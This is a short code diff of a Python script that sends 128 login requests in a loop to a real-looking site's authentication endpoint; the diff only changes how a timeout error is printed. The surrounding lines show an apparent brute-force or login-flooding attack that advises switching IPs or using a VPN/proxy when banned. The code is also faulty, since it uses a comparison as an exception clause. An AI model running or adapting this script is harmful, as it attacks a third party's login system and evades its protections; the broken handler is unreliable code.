@@ -20,8 +20,7 @@ for i in range(128):
         r = requests.post("https://navi51.com/auth/login", json=data, timeout=5)
         print(f"Timeout: 5s\n\nSent Data: {data}\n\nStatus Code:\n{r.status_code}\n\nReturned JSON:\n{r.json()}")
     except requests.exceptions.ReadTimeout as e:
-        print(f"Read time out, error:\n\n{e}")
-        print("\nAttempting to continue..")
+        print(f"Read time out, attempting to continue...")
         continue
     except r.status_code == 403:
         print("IP banned, switch IPs or use a VPN/Proxy")
